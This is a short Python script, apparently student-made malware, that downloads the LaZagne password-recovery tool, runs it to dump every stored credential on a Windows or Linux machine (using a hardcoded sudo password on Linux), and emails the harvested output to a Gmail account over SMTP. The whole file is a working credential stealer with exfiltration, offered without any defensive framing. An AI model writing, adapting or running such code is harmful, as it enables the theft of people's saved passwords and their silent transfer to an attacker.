#! /usr/bin/env python
import subprocess
import smtplib
import requests
import sys , os, tempfile

def send_mail(email,password,data_output):
    message = "\n"+data_output[0].decode()
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)

def fetch_data_for_windows(url):
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    output_file = open(file_name,"wb")
    for response in get_response:
        output_file.write(response)
    data_output = subprocess.check_output("lazagne.exe all")
    os.remove(file_name)
    if data_output is not None:
        return data_output
    else:
        sys.exit(0)


def fetch_data_for_linux():
    sudo_password = "virus1995"
    get_file_command = "wget -r -np -nH --cut-dirs=2 -R malware.py http://localhost/Directory/Linux -P /home/vickyvirus/Lazagne"
    subprocess.call("echo {} | sudo -S {}".format(sudo_password, get_file_command),shell=True)
    data_output = subprocess.check_output("echo {} | sudo -S python3 laZagne.py all".format(sudo_password), shell=True,cwd="/home/vickyvirus/Lazagne")
    if data_output[0] is not None:
        return data_output
    else:
        print("No Data Found")
        sys.exit(0)

# For Linux OS
data_output = fetch_data_for_linux()

# For Windows OS
# data output = fetch_data_for_windows("http://localhost/Directory/lazagne.exe")

email="abc@gmail.com"
password = "123456"
send_mail(email,password,data_output)
